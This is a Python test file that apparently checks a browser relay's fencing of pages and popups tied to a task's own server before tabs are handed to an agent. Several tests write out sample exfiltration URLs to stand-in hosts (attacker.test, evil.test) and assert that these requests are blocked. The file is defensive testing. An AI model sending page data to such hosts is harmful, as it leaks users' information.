# Copyright (c) 2026-present Plane Software, Inc. and contributors
# SPDX-License-Identifier: AGPL-3.0-only
# See the LICENSE file for details.

"""What a fenced command wrote and a hand-off: a page that held it marks
what it opened, for as long as that is open, whatever it shows. The rig is `tests/support/rigs/relay_rig.py`; the
real Chrome's half is `tests/integration/device/test_device_chrome_written.py`."""

from __future__ import annotations

import asyncio
import logging

import pytest

from tests.support.rigs.relay_rig import (
    A,
    Agent,
    Listed,
    commit,
    goes,
    navigated,
    on_off_list,
    relay_said,
    replies,
    requested,
    second_page,
    until,
)
from tests.support.rigs.relay_rig import listed as listed
from tests.support.rigs.relay_rig import rig as rig

OWN = "http://127.0.0.1:3000/own.html"


async def _went_to(listed: Listed, session: str, url: str, loader: str, frame: str = "f") -> None:
    await commit(listed.rig, session, url, loader, frame=frame)
    page = frame if frame != "f" else listed.page
    await until(lambda: listed.rig.chrome.top_of(page) == url, "the commit")


async def test_a_blank_popup_of_a_commands_page_stops_every_hand_off(listed: Listed) -> None:
    """The popup shows `about:blank`, its opener a listed site, and the popup's script runs on."""
    rig = listed.rig
    await _went_to(listed, listed.session, OWN, "own")
    await second_page(listed, "P1", "about:blank")
    await _went_to(listed, listed.session, "https://a.test/", "left")
    rig.chrome.hand_over(A)
    assert not rig.chrome.handed(A)
    await goes(listed, "steer", "https://attacker.test/?d=the-commands-data")
    assert await relay_said(listed, "steer") == "Fetch.failRequest"


async def test_a_page_opened_before_its_opener_held_it_is_marked_too(listed: Listed) -> None:
    """A page gets at what it opened by name, whatever it held then."""
    rig = listed.rig
    await second_page(listed, "P1", "https://a.test/popup")
    await _went_to(listed, listed.session, OWN, "own")
    await _went_to(listed, listed.session, "https://a.test/", "left")
    rig.chrome.hand_over(A)
    assert not rig.chrome.handed(A)


async def test_what_a_marked_page_opened_is_marked_in_turn(listed: Listed) -> None:
    rig = listed.rig
    await _went_to(listed, listed.session, OWN, "own")
    await second_page(listed, "P1", "about:blank")
    await second_page(listed, "P2", "about:blank", opener="P1")
    await _went_to(listed, listed.session, "https://a.test/", "left")
    await rig.fake.peer.emit("Target.targetDestroyed", {"targetId": "P1"})
    await until(lambda: "P1" not in rig.chrome.fenced_pages(), "the page between, gone")
    rig.chrome.hand_over(A)
    assert not rig.chrome.handed(A), "the mark stays where it was put"


async def test_with_the_marked_page_closed_a_hand_off_works(listed: Listed) -> None:
    rig = listed.rig
    await _went_to(listed, listed.session, OWN, "own")
    await second_page(listed, "P1", "about:blank")
    await _went_to(listed, listed.session, "https://a.test/", "left")
    await rig.fake.peer.emit("Target.targetDestroyed", {"targetId": "P1"})
    await until(lambda: "P1" not in rig.chrome.fenced_pages(), "the popup, gone")
    rig.chrome.hand_over(A)
    assert rig.chrome.handed(A) == {listed.page}


async def test_a_tab_that_left_and_opened_nothing_is_handed(listed: Listed) -> None:
    """Its document is gone, and with it every reference: the page itself carries no mark."""
    rig = listed.rig
    await _went_to(listed, listed.session, OWN, "own")
    await _went_to(listed, listed.session, "https://a.test/", "left")
    rig.chrome.hand_over(A)
    assert rig.chrome.handed(A) == {listed.page}


async def test_a_noopener_tab_holds_no_reference_and_is_not_marked(listed: Listed) -> None:
    """Chrome names an opener for one all the same: what the agent's own new tab looks like."""
    rig = listed.rig
    await _went_to(listed, listed.session, OWN, "own")
    await _went_to(listed, listed.session, "https://a.test/", "left")
    await second_page(listed, "P1", "https://a.test/tab", reference=False)
    rig.chrome.hand_over(A)
    assert rig.chrome.handed(A) == {listed.page, "P1"}


async def test_a_page_that_held_a_frame_of_a_commands_marks_what_it_opened(listed: Listed) -> None:
    rig = listed.rig
    await commit(rig, listed.session, OWN, "kid", frame="kid", parent=listed.page)
    await second_page(listed, "P1", "about:blank")
    await rig.fake.peer.emit("Page.frameDetached", {"frameId": "kid"}, session=listed.session)
    await until(lambda: "kid" not in rig.chrome.documents_of(listed.page), "the frame, gone")
    rig.chrome.hand_over(A)
    assert not rig.chrome.handed(A)


async def test_a_marked_popup_opening_in_a_pass_ends_it(listed: Listed) -> None:
    """A sign-in's popup, from a tab that showed the task's own server before."""
    rig = listed.rig
    await _went_to(listed, listed.session, OWN, "own")
    await _went_to(listed, listed.session, "https://a.test/", "left")
    rig.chrome.hand_over(A)
    assert rig.chrome.handed(A)
    rig.fake.window_of["P1"] = rig.fake.window_of[listed.page]
    popup = await rig.fake.announce("P1", opener=listed.page, url="")
    await until(lambda: "P1" in rig.chrome.fenced_pages(), "the popup is fenced")
    assert not rig.chrome.handed(A)
    await requested(rig, popup, "gone", "P1", "https://evil.test/?data=2")
    assert await relay_said(listed, "gone") == "Fetch.failRequest"


async def test_a_commands_frame_landing_ends_the_pass(listed: Listed) -> None:
    rig = listed.rig
    rig.chrome.hand_over(A)
    await on_off_list(listed)
    await commit(rig, listed.session, OWN, "kid", frame="kid", parent=listed.page)
    assert await navigated(rig, listed.session) == "https://a.test/"
    assert not rig.chrome.handed(A)


async def test_such_a_frame_gone_again_gives_no_pass_back(listed: Listed) -> None:
    rig = listed.rig
    rig.chrome.hand_over(A)
    await commit(rig, listed.session, OWN, "kid", frame="kid", parent=listed.page)
    await rig.fake.peer.emit("Page.frameDetached", {"frameId": "kid"}, session=listed.session)
    await until(lambda: "kid" not in rig.chrome.documents_of(listed.page), "the frame, gone")
    await goes(listed, "after", "https://www.amazon.test/")
    assert await relay_said(listed, "after") == "Fetch.failRequest"


async def test_such_a_frame_landing_under_a_parent_that_went_ends_it_too(listed: Listed) -> None:
    rig = listed.rig
    rig.chrome.hand_over(A)
    await commit(rig, listed.session, OWN, "kid", frame="kid", parent="gone-by-now")
    await until(lambda: not rig.chrome.handed(A), "the pass, over")


async def test_a_navigation_on_its_way_to_a_commands_page_stops_a_hand_off(listed: Listed) -> None:
    """A page's first assets can beat word of its commit."""
    rig = listed.rig
    popup = await second_page(listed, "P1", "https://a.test/other")
    await requested(rig, popup, "own", "P1", OWN)
    await until(lambda: "P1" in rig.chrome.navigating(), "the navigation")
    rig.chrome.hand_over(A)
    assert not rig.chrome.handed(A)


async def test_nothing_is_carried_while_one_is_on_its_way(listed: Listed) -> None:
    rig = listed.rig
    popup = await second_page(listed, "P1", "https://a.test/other")
    rig.chrome.hand_over(A)
    await requested(rig, popup, "own", "P1", OWN)
    await until(lambda: "P1" in rig.chrome.navigating(), "the navigation")
    await goes(listed, "leak", "https://evil.test/?data=1")
    assert await relay_said(listed, "leak") == "Fetch.failRequest"


async def test_a_refused_navigation_to_one_stops_nothing_once_its_error_page_lands(listed: Listed) -> None:
    rig = listed.rig
    await requested(rig, listed.session, "own", listed.page, OWN)
    await relay_said(listed, "own")
    error = {"id": listed.page, "url": "chrome-error://chromewebdata/", "unreachableUrl": OWN}
    await rig.fake.peer.emit("Page.frameNavigated", {"frame": error}, session=listed.session)
    await until(lambda: listed.page not in rig.chrome.navigating(), "that navigation, over")


async def test_a_pass_on_one_page_leaves_the_rest_of_the_task_looked_at(listed: Listed) -> None:
    """A tab no pass carries lands off the list on a navigation no fence saw: taken off it, pass or none."""
    rig = listed.rig
    tab = await rig.fake.announce("P1", window=rig.fake.window_of[listed.page], url="")
    await until(lambda: "P1" in rig.chrome.fenced_pages(), "the tab is fenced")
    rig.chrome.hand_over(A)
    await commit(rig, tab, "https://evil.test/cached", "cached", frame="P1")
    assert await navigated(rig, tab) == "about:blank"
    assert [d["host"] for d in rig.registry.frames[A].denials] == ["evil.test"]


async def test_a_commit_of_a_handed_page_is_the_persons_still(listed: Listed) -> None:
    rig = listed.rig
    rig.chrome.hand_over(A)
    await commit(rig, listed.session, "https://evil.test/", "there")
    await until(lambda: rig.chrome.top_of(listed.page), "the commit")
    assert not rig.fake.sent("Page.navigate")


def _no_verdict(frame: str, url: str = "https://evil.test/x") -> dict[str, object]:
    return {"requestId": "bw", "frameId": frame, "resourceType": "Image", "request": {"url": url}}


async def test_a_request_nothing_fenced_is_judged_and_logged(
    listed: Listed, caplog: pytest.LogCaptureFixture
) -> None:
    """Past this session only the proxy is left, and a live pass widens that."""
    rig = listed.rig
    with caplog.at_level(logging.WARNING):
        await rig.fake.peer.emit("Fetch.requestPaused", _no_verdict("nobody"))
        assert await relay_said(listed, "bw") == "Fetch.failRequest"
    assert "no verdict" in caplog.text


async def test_a_listed_host_from_nothing_fenced_is_still_let_by(listed: Listed) -> None:
    await listed.rig.fake.peer.emit("Fetch.requestPaused", _no_verdict("nobody", "https://a.test/x"))
    assert await relay_said(listed, "bw") == "Fetch.continueRequest"


async def test_an_iframes_request_past_its_pages_fence_goes_on(listed: Listed) -> None:
    rig = listed.rig
    attached = {"frameId": "kid", "parentFrameId": listed.page}
    await rig.fake.peer.emit("Page.frameAttached", attached, session=listed.session)
    await asyncio.sleep(0.01)
    await rig.fake.peer.emit("Fetch.requestPaused", _no_verdict("kid"))
    await until(lambda: replies(rig, "bw"), "its answer")
    assert replies(rig, "bw")[0]["method"] == "Fetch.continueRequest"


async def test_the_agents_history_says_host_and_path_of_a_site_off_its_list(listed: Listed) -> None:
    rig = listed.rig
    entries = [
        {"id": 1, "url": "https://a.test/?q=1", "userTypedURL": "https://a.test/?q=1", "title": "mine"},
        {
            "id": 2,
            "url": "https://www.amazon.test:8443/ap/oa?code=SECRET#token=SECRET",
            "userTypedURL": "https://www.amazon.test:8443/ap/oa?code=SECRET#token=SECRET",
            "title": "www.amazon.test/ap/oa?code=SECRET",
        },
        {"id": 3, "url": "about:blank", "userTypedURL": "about:blank", "title": ""},
    ]
    real = rig.fake.answer

    async def answer(method: str, params: dict[str, object], session: str | None) -> dict[str, object]:
        if method == "Page.getNavigationHistory":
            return {"currentIndex": 1, "entries": entries}
        return await real(method, params, session)

    rig.fake.peer.answer = answer
    agent = Agent(rig.chrome, A)
    session = (await agent.ask("Target.attachToTarget", {"targetId": listed.page, "flatten": True}))[
        "result"
    ]["sessionId"]
    said = (await agent.ask("Page.getNavigationHistory", session=session))["result"]
    assert said["entries"][0]["url"] == "https://a.test/?q=1" and said["entries"][0]["title"] == "mine"
    assert said["entries"][1] == {
        "id": 2,
        "url": "https://www.amazon.test:8443/ap/oa",
        "userTypedURL": "https://www.amazon.test:8443/ap/oa",
        "title": "www.amazon.test",
    }
    assert said["entries"][2]["url"] == "about:blank"
    assert said["currentIndex"] == 1
